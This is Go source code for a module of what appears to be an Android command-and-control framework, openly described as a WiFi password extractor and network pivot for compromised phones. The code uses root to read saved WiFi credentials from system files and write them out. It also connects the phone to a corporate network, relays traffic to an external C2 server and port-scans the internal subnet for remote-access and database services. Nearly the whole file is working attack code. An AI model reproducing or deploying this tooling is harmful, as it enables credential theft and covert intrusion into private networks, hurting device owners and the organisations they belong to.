// //go:build android

package c2

/*
	SUDOSOC-C2 — Android WiFi Password Extractor & Network Pivot
	Copyright (C) 2026  sudosoc — Seif

	Two capabilities in one:
	1. WiFi Password Extraction
	   Android stores all WiFi credentials in WifiConfigStore.xml (Android 9+)
	   or wpa_supplicant.conf (older). Root access exposes all saved passwords.

	2. Network Pivot via Corporate WiFi
	   When a compromised phone knows a corporate WiFi password:
	   → Connect to the corporate network
	   → Use the phone as a pivot point
	   → Access internal resources not reachable from the internet
	   → The phone appears as a legitimate employee device

	WiFi credential locations:
	  Android 9+:  /data/misc/wifi/WifiConfigStore.xml
	  Android 8:   /data/misc/wifi/WifiConfigStore.xml
	  Android 7-:  /data/misc/wifi/wpa_supplicant.conf
	  WPA Backup:  /data/misc/wifi/softap.conf

	Enterprise (WPA2-Enterprise):
	  Credentials in KeyStore: /data/misc/keystore/user_0/
	  Certificates: /data/misc/wifi/certs/

	AP Hopping:
	  Phone connects to corporate WiFi
	  → Runs as TCP/UDP relay for C2 traffic
	  → C2 server on internet tunnels through the phone
	  → Reaches internal corporate systems
*/

import (
	"encoding/xml"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// WifiCredential holds a saved WiFi network credential
type WifiCredential struct {
	SSID        string
	BSSID       string
	Password    string
	SecurityType string // WPA2, WEP, Open, WPA2-Enterprise
	Hidden      bool
	Identity    string // for Enterprise networks (username)
	Certificate string // for Enterprise networks
	Priority    int
}

// WifiExtractor manages WiFi credential extraction
type WifiExtractor struct {
	OutputDir string
}

// NewWifiExtractor creates a new WiFi extractor
func NewWifiExtractor(outputDir string) *WifiExtractor {
	os.MkdirAll(outputDir, 0700)
	return &WifiExtractor{OutputDir: outputDir}
}

// ExtractAll attempts all extraction methods
func (w *WifiExtractor) ExtractAll() ([]WifiCredential, error) {
	var allCreds []WifiCredential
	var lastErr error

	// Method 1: WifiConfigStore.xml (Android 9+, requires root)
	creds, err := w.extractFromConfigStore()
	if err == nil {
		allCreds = append(allCreds, creds...)
	} else {
		lastErr = err
	}

	// Method 2: wpa_supplicant.conf (Android < 9, requires root)
	creds, err = w.extractFromWPASupplicant()
	if err == nil {
		allCreds = append(allCreds, creds...)
	}

	// Method 3: Android Backup API (backup must be enabled)
	creds, err = w.extractFromBackup()
	if err == nil {
		allCreds = append(allCreds, creds...)
	}

	if len(allCreds) == 0 && lastErr != nil {
		return nil, lastErr
	}

	// Deduplicate
	seen := make(map[string]bool)
	var unique []WifiCredential
	for _, c := range allCreds {
		key := c.SSID + c.SecurityType
		if !seen[key] {
			seen[key] = true
			unique = append(unique, c)
		}
	}

	// Save to file
	w.saveCredentials(unique)

	return unique, nil
}

// ── Android 9+ WifiConfigStore.xml ───────────────────────────────

type wifiConfigStore struct {
	XMLName  xml.Name    `xml:"WifiConfigStoreData"`
	Networks wifiNetwork `xml:"NetworkList"`
}

type wifiNetwork struct {
	Configs []networkConfig `xml:"Network"`
}

type networkConfig struct {
	SSID      string   `xml:"WifiConfiguration>string"`
	Password  string   `xml:",any"`
}

func (w *WifiExtractor) extractFromConfigStore() ([]WifiCredential, error) {
	paths := []string{
		"/data/misc/wifi/WifiConfigStore.xml",
		"/data/misc/wifi/WifiConfigStoreSoftAp.xml",
	}

	var creds []WifiCredential
	for _, path := range paths {
		data, err := readFileRoot(path)
		if err != nil {
			continue
		}

		// Parse XML to extract SSID + Password pairs
		// The XML structure varies by Android version
		parsed := parseWifiConfigXML(string(data))
		creds = append(creds, parsed...)
	}

	if len(creds) == 0 {
		return nil, fmt.Errorf("no WiFi config found")
	}
	return creds, nil
}

func parseWifiConfigXML(content string) []WifiCredential {
	var creds []WifiCredential

	// Parse WifiConfigStore.xml — find SSID/password pairs
	lines := strings.Split(content, "\n")
	var current WifiCredential
	inNetwork := false

	for _, line := range lines {
		line = strings.TrimSpace(line)

		if strings.Contains(line, "<Network>") {
			inNetwork = true
			current = WifiCredential{}
		}

		if inNetwork {
			if strings.Contains(line, `name="SSID"`) {
				// <string name="SSID">&quot;MyNetwork&quot;</string>
				val := extractXMLValue(line)
				current.SSID = strings.Trim(val, `"&quot;`)
				current.SSID = strings.ReplaceAll(current.SSID, "&quot;", "")
			}
			if strings.Contains(line, `name="PreSharedKey"`) ||
				strings.Contains(line, `name="WepKeys"`) {
				val := extractXMLValue(line)
				current.Password = strings.Trim(val, `"`)
				if current.Password != "null" && current.Password != "" {
					current.SecurityType = "WPA2"
				}
			}
			if strings.Contains(line, `name="AllowedKeyManagement"`) {
				if strings.Contains(line, "NONE") {
					current.SecurityType = "Open"
				}
			}
			if strings.Contains(line, `name="Identity"`) {
				current.Identity = extractXMLValue(line)
				current.SecurityType = "WPA2-Enterprise"
			}
		}

		if strings.Contains(line, "</Network>") && inNetwork {
			if current.SSID != "" {
				creds = append(creds, current)
			}
			inNetwork = false
		}
	}

	return creds
}

// ── wpa_supplicant.conf (older Android) ──────────────────────────

func (w *WifiExtractor) extractFromWPASupplicant() ([]WifiCredential, error) {
	data, err := readFileRoot("/data/misc/wifi/wpa_supplicant.conf")
	if err != nil {
		return nil, err
	}

	return parseWPASupplicant(string(data)), nil
}

func parseWPASupplicant(content string) []WifiCredential {
	var creds []WifiCredential
	var current WifiCredential
	inNetwork := false

	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)

		if line == "network={" {
			inNetwork = true
			current = WifiCredential{}
			continue
		}

		if inNetwork {
			if strings.HasPrefix(line, "ssid=") {
				current.SSID = strings.Trim(strings.TrimPrefix(line, "ssid="), `"`)
			}
			if strings.HasPrefix(line, "psk=") {
				current.Password = strings.Trim(strings.TrimPrefix(line, "psk="), `"`)
				current.SecurityType = "WPA2"
			}
			if strings.HasPrefix(line, "wep_key0=") {
				current.Password = strings.TrimPrefix(line, "wep_key0=")
				current.SecurityType = "WEP"
			}
			if strings.HasPrefix(line, "key_mgmt=NONE") {
				current.SecurityType = "Open"
			}
			if strings.HasPrefix(line, "identity=") {
				current.Identity = strings.Trim(strings.TrimPrefix(line, "identity="), `"`)
			}
		}

		if line == "}" && inNetwork {
			if current.SSID != "" {
				creds = append(creds, current)
			}
			inNetwork = false
		}
	}

	return creds
}

func (w *WifiExtractor) extractFromBackup() ([]WifiCredential, error) {
	// Android backup API can expose WiFi passwords
	// adb backup -noapk com.android.wifi
	// This requires USB debugging + user confirmation
	return nil, fmt.Errorf("backup extraction requires physical access")
}

func (w *WifiExtractor) saveCredentials(creds []WifiCredential) {
	f, err := os.Create(filepath.Join(w.OutputDir, "wifi_passwords.txt"))
	if err != nil {
		return
	}
	defer f.Close()

	f.WriteString("=== WiFi Credentials ===\n\n")
	for _, c := range creds {
		f.WriteString(fmt.Sprintf("SSID:     %s\n", c.SSID))
		f.WriteString(fmt.Sprintf("Security: %s\n", c.SecurityType))
		if c.Password != "" {
			f.WriteString(fmt.Sprintf("Password: %s\n", c.Password))
		}
		if c.Identity != "" {
			f.WriteString(fmt.Sprintf("Identity: %s\n", c.Identity))
		}
		f.WriteString("\n")
	}
}

// ── Network Pivot ─────────────────────────────────────────────────

// NetworkPivot manages WiFi pivoting to internal networks
type NetworkPivot struct {
	TargetSSID   string
	Password     string
	C2ServerAddr string   // external C2 server address
	LocalPort    int      // local proxy port
	listener     net.Listener
}

// NewNetworkPivot creates a new network pivot
func NewNetworkPivot(ssid, password, c2Addr string, localPort int) *NetworkPivot {
	return &NetworkPivot{
		TargetSSID:   ssid,
		Password:     password,
		C2ServerAddr: c2Addr,
		LocalPort:    localPort,
	}
}

// ConnectToNetwork connects the phone to a specific WiFi network
func (p *NetworkPivot) ConnectToNetwork() error {
	// Use wpa_cli to connect
	wpaCmd := fmt.Sprintf(
		`wpa_cli add_network && \
		 wpa_cli set_network 0 ssid '"%s"' && \
		 wpa_cli set_network 0 psk '"%s"' && \
		 wpa_cli select_network 0 && \
		 wpa_cli reconnect`,
		p.TargetSSID, p.Password)

	cmd := exec.Command("su", "-c", wpaCmd)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("wpa_cli connect failed: %v", err)
	}

	// Wait for IP address
	for i := 0; i < 30; i++ {
		time.Sleep(time.Second)
		if ip := getWiFiIP(); ip != "" {
			return nil
		}
	}
	return fmt.Errorf("no IP address obtained after 30 seconds")
}

// StartPivot starts a SOCKS5 proxy on the phone
// Forwards traffic from C2 server into the corporate network
func (p *NetworkPivot) StartPivot() error {
	var err error
	p.listener, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", p.LocalPort))
	if err != nil {
		return err
	}

	go p.pivotLoop()
	return nil
}

func (p *NetworkPivot) pivotLoop() {
	for {
		conn, err := p.listener.Accept()
		if err != nil {
			return
		}
		go p.handlePivotConnection(conn)
	}
}

func (p *NetworkPivot) handlePivotConnection(clientConn net.Conn) {
	defer clientConn.Close()

	// Simple TCP relay — forwards to C2 server
	serverConn, err := net.DialTimeout("tcp", p.C2ServerAddr, 30*time.Second)
	if err != nil {
		return
	}
	defer serverConn.Close()

	// Bidirectional copy
	done := make(chan struct{}, 2)
	go func() {
		relay(clientConn, serverConn)
		done <- struct{}{}
	}()
	go func() {
		relay(serverConn, clientConn)
		done <- struct{}{}
	}()
	<-done
}

// ScanInternalNetwork scans the internal network for open services
func (p *NetworkPivot) ScanInternalNetwork() []string {
	ip := getWiFiIP()
	if ip == "" {
		return nil
	}

	// Determine subnet
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return nil
	}
	subnet := strings.Join(parts[:3], ".") + ".0/24"

	var open []string

	// Common ports to check
	ports := []int{22, 80, 443, 445, 3389, 8080, 8443, 5985, 5986, 1433, 3306}

	// Simple port scan
	for host := 1; host <= 254; host++ {
		targetIP := fmt.Sprintf("%s.%s.%s.%d", parts[0], parts[1], parts[2], host)
		for _, port := range ports {
			addr := fmt.Sprintf("%s:%d", targetIP, port)
			conn, err := net.DialTimeout("tcp", addr, 500*time.Millisecond)
			if err == nil {
				conn.Close()
				open = append(open, addr)
			}
		}
	}

	_ = subnet
	return open
}

// ── Helpers ──────────────────────────────────────────────────────

func readFileRoot(path string) ([]byte, error) {
	// Try direct read first
	if data, err := os.ReadFile(path); err == nil {
		return data, nil
	}
	// Try via su
	tmpFile := "/data/local/tmp/.wf_tmp"
	out, err := exec.Command("su", "-c",
		fmt.Sprintf("cat '%s' > '%s'", path, tmpFile)).CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("%v: %s", err, out)
	}
	data, err := os.ReadFile(tmpFile)
	os.Remove(tmpFile)
	return data, err
}

func extractXMLValue(line string) string {
	start := strings.Index(line, ">")
	end := strings.LastIndex(line, "<")
	if start == -1 || end == -1 || end <= start {
		return ""
	}
	return line[start+1 : end]
}

func getWiFiIP() string {
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		if strings.HasPrefix(iface.Name, "wlan") {
			addrs, _ := iface.Addrs()
			for _, addr := range addrs {
				if ipNet, ok := addr.(*net.IPNet); ok && ipNet.IP.To4() != nil {
					return ipNet.IP.String()
				}
			}
		}
	}
	return ""
}

func relay(dst, src net.Conn) {
	buf := make([]byte, 32*1024)
	for {
		n, err := src.Read(buf)
		if n > 0 {
			dst.Write(buf[:n])
		}
		if err != nil {
			return
		}
	}
}
